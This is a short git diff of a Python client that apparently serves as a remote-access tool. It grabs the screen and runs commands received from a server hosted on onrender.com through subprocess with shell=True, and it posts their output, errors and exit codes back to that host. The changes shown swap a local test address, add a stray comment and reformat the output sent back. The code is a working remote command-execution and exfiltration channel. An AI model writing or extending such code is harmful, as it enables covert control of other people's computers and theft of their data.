@@ -20,9 +20,8 @@ from pyautogui import size
 from mss import mss
 import tkinter as tk
 
-
 url = "https://ms32-c67b.onrender.com/"
-# url = "http://192.168.9.115:5000/"
+# url = "http://127.0.0.1:5000/"
 screen = get_primary_display()
 terminate = False
 sstate = False
@@ -287,7 +286,7 @@ def flip():
 def runcmd(cmd):
     try:
         command = cmd
-
+        #kahe?
         try:
             result = sbrun(command, shell=True, capture_output=True, text=True)
             stdout = result.stdout
@@ -299,7 +298,9 @@ def runcmd(cmd):
             exit_code = -1
         if not stderr:stderr="none"
         if not stdout:stdout="none"
-        post(url+"terminal_output",json={"output":stdout,"code":exit_code,"err":stderr})        
+        output = f"OUTPUT:\t{stdout}\nERROR:\t{stderr}\nCODE:\t{exit_code}"
+        post(url+"terminal",json={"output":output})  
+        print("done")      
 
     except Exception as e:
         log(f"runcmd thread error:\t{e}",state="WARN")
